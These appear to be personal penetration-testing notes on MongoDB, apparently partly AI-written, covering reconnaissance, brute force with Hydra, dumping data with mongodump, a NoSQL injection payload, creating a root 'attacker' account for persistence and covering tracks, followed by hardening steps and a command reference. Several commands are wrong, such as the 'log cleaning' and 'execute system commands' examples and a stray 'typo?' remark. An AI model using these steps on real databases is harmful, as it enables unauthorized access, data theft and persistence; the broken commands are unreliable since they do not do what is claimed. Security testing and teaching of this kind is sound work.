Tags: [[Mongodb]] [[Penetration Testing]] [[Cybersecurity]]

### Penetration Testing MongoDB - Notes

#### **Overview**
MongoDB is a NoSQL database known for its flexibility and scalability. However, its misconfigurations and default settings have made it a frequent target for attackers. Penetration testing MongoDB focuses on uncovering security flaws in deployment, configuration, and access control.

---

### **MongoDB Components to Test**
1. **Authentication**: Weak or misconfigured authentication mechanisms.
2. **Authorization**: Improperly implemented role-based access controls (RBAC).
3. **Network Exposure**: Unsecured database instances accessible over the internet.
4. **Configuration**: Default or insecure settings.
5. **Data Encryption**: Lack of encryption at rest or during transit.

---

### **Common MongoDB Vulnerabilities**
1. **Default Configuration**: Older versions allow unrestricted access to the database without authentication.
2. **No Authentication**: Misconfigured authentication settings.
3. **Exposed Ports**: MongoDB commonly runs on port `27017`, which attackers scan for.
4. **Unauthorized Data Access**: Weak or missing access control rules.
5. **Arbitrary Code Execution**: Exploitation of database commands or drivers.
6. **Privilege Escalation**: Misconfigured roles allowing unnecessary access.
7. **Data Exfiltration**: Poorly secured backups or data dumps.

---

### **Penetration Testing Checklist**

#### **1. Reconnaissance**
- Scan for MongoDB services:
  ```bash
  nmap -p 27017 --script mongodb-info <target-ip>
  ```
- Identify open ports and running services:
  ```bash
  nmap -sV -p 27017 <target-ip>
  ```

- Use tools like **Shodan** to find publicly exposed MongoDB instances:
  ```
  "MongoDB server information" port:27017
  ```

#### **2. Authentication Testing**
- Test for unauthenticated access:
  ```bash
  mongo --host <target-ip> --port 27017
  ```
  If successful, this indicates the database is misconfigured to allow anonymous access.

- Brute force credentials using **Hydra**:
  ```bash
  hydra -l admin -P passwords.txt <target-ip> mongodb
  ```

#### **3. Authorization Testing**
- Enumerate databases:
  ```bash
  show dbs
  ```

- Test for over-permissive roles:
  - Read/write access:
    ```javascript
    db.collection.insertOne({ "test": "data" })
    ```
  - Administrative commands:
    ```javascript
    db.runCommand({ "listDatabases": 1 })
    ```

#### **4. Data Dump and Exfiltration**
- Dump databases using `mongodump`:
  ```bash
  mongodump --host <target-ip> --port 27017 -o dump/
  ```
- Export specific collections:
  ```bash
  mongoexport --db <database> --collection <collection> --out <file.json>
  ```

#### **5. Testing for Network Exposure**
- Check for unrestricted access to MongoDB ports:
  ```bash
  telnet <target-ip> 27017
  ```
- Identify if MongoDB binds to public IP addresses:
  - Look for lines like `bind_ip: 0.0.0.0` in the configuration file.

#### **6. Privilege Escalation**
- Exploit misconfigured roles:
  ```javascript
  db.createUser({
    user: "attacker",
    pwd: "password",
    roles: ["root"]
  });
  ```
  If successful, you’ve gained administrative privileges.

#### **7. Code Injection**
- Test for NoSQL injection in web applications interacting with MongoDB.
  Example vulnerable query:
  ```javascript
  db.users.find({ username: input.username, password: input.password });
  ```
- Test payload:
  ```json
  {"$gt": ""}
  ```
  - This can bypass authentication if the application does not properly validate inputs.

#### **8. SSL/TLS Encryption**
- Verify if traffic between client and MongoDB is encrypted:
  ```bash
  openssl s_client -connect <target-ip>:27017
  ```
  If SSL/TLS is not configured, sensitive data may be exposed during transit.

#### **9. Backup Files**
- Look for exposed backups:
  ```bash
  curl http://<target-ip>/backup/mongodb.dump
  ```

---

### **Post-Exploitation**
1. **Extract Sensitive Data**:
   - Look for user credentials, API keys, and sensitive business data.
   - Export databases or collections using `mongoexport`.

2. **Establish Persistence**:
   - Create a new admin user:
     ```javascript
     db.createUser({
       user: "attacker",
       pwd: "password123",
       roles: ["root"]
     });
     ```

3. **Lateral Movement**:
   - Use compromised MongoDB as a foothold to access other parts of the network.

4. **Clean Logs**:
   - If possible, delete traces of the attack:
     ```bash
     db.currentOp().killOp(<opId>);
     ```

---

### **Defensive Measures**
1. **Enable Authentication**: Always require authentication for access.
   - Edit the MongoDB configuration file (`mongod.conf`) and set:
     ```yaml
     security:
       authorization: "enabled"
     ```
   - Restart MongoDB:
     ```bash
     sudo systemctl restart mongod
     ```

2. **Restrict Network Access**:
   - Bind MongoDB to localhost or specific IPs:
     ```yaml
     net:
       bindIp: 127.0.0.1
     ```

3. **Use Firewalls**:
   - Block external access to port `27017` using `iptables` or cloud security groups.

4. **Update Regularly**:
   - Keep MongoDB and its drivers updated to patch known vulnerabilities.

5. **Enable Encryption**:
   - Encrypt data at rest using MongoDB's native encryption.
   - Enable SSL/TLS for data in transit.

6. **Implement RBAC**:
   - Assign least-privileged roles to users.

7. **Monitor Logs**:
   - Enable logging and monitor logs for suspicious activities:
     ```yaml
     systemLog:
       destination: file
       path: /var/log/mongodb/mongod.log
     ```

---

### **Useful Tools for MongoDB Penetration Testing**
- **MongoDB Shell (`mongo`)**: Interact directly with the database.
- **nmap**: Scan for open MongoDB ports and services.
- **WPScan**: Not applicable; typo?
- **NoSQLMap**: Exploit NoSQL injection vulnerabilities.
- **Hydra**: Perform brute force attacks on MongoDB.
- **Burp Suite**: Intercept and manipulate NoSQL queries in web applications.
- **Shodan**: Find publicly exposed MongoDB instances.


## Mongodb Commands

Here's a list of commonly used MongoDB commands and queries to interact with a database once you gain access. These commands are useful for exploration, enumeration, and potential data extraction.

---

### **Basic MongoDB Commands**

#### **Authentication and Connection**
- Switch to a database:
  ```javascript
  use <database_name>
  ```

- Show current database:
  ```javascript
  db
  ```

- List all databases:
  ```javascript
  show databases
  ```

- Authenticate a user:
  ```javascript
  db.auth("<username>", "<password>")
  ```

---

### **Enumeration**

#### **Users and Roles**
- List all users:
  ```javascript
  db.getUsers()
  ```

- Get roles of a user:
  ```javascript
  db.getUser("<username>")
  ```

#### **Collections**
- List all collections in the current database:
  ```javascript
  show collections
  ```

- View stats for a collection:
  ```javascript
  db.<collection_name>.stats()
  ```

#### **Indexes**
- List indexes in a collection:
  ```javascript
  db.<collection_name>.getIndexes()
  ```

#### **Configuration Information**
- View server configuration:
  ```javascript
  db.adminCommand({ getCmdLineOpts: 1 })
  ```

- Check the server build info:
  ```javascript
  db.version()
  db.serverBuildInfo()
  ```

---

### **Data Exploration**

#### **Retrieve Documents**
- Retrieve all documents from a collection:
  ```javascript
  db.<collection_name>.find()
  ```

- Retrieve a single document:
  ```javascript
  db.<collection_name>.findOne()
  ```

- Filter documents:
  ```javascript
  db.<collection_name>.find({ <field>: <value> })
  ```

#### **Count and Stats**
- Count the number of documents in a collection:
  ```javascript
  db.<collection_name>.countDocuments()
  ```

- Show stats for the database:
  ```javascript
  db.stats()
  ```

---

### **Inserting and Modifying Data**
*(Use with caution during penetration tests.)*

- Insert a document:
  ```javascript
  db.<collection_name>.insert({ <field1>: <value1>, <field2>: <value2> })
  ```

- Update a document:
  ```javascript
  db.<collection_name>.update({ <query> }, { $set: { <field>: <new_value> } })
  ```

- Delete a document:
  ```javascript
  db.<collection_name>.remove({ <query> })
  ```

---

### **Administrative Commands**

#### **Database Operations**
- Drop a database:
  ```javascript
  db.dropDatabase()
  ```

- Drop a collection:
  ```javascript
  db.<collection_name>.drop()
  ```

#### **Backup**
- Export data (run from the server shell):
  ```bash
  mongodump --db <database_name>
  ```

#### **Logs**
- View current operation logs:
  ```javascript
  db.currentOp()
  ```

---

### **Potential Exploitation**

#### **Sensitive Data Enumeration**
- Search for passwords or credentials in collections:
  ```javascript
  db.<collection_name>.find({ $or: [{ "password": { $exists: true } }, { "credentials": { $exists: true } }] })
  ```

#### **Shell Commands**
If you have elevated permissions:
- Execute system commands:
  ```javascript
  db.adminCommand({ eval: "return runCommand('ls')" })
  ```

---

### **Exit the Shell**
- Quit `mongosh`:
  ```javascript
  exit
  ```

---

This list should help you explore MongoDB environments effectively. If you're conducting a penetration test, always follow ethical guidelines and the scope of your engagement. Let me know if you need clarification or further examples!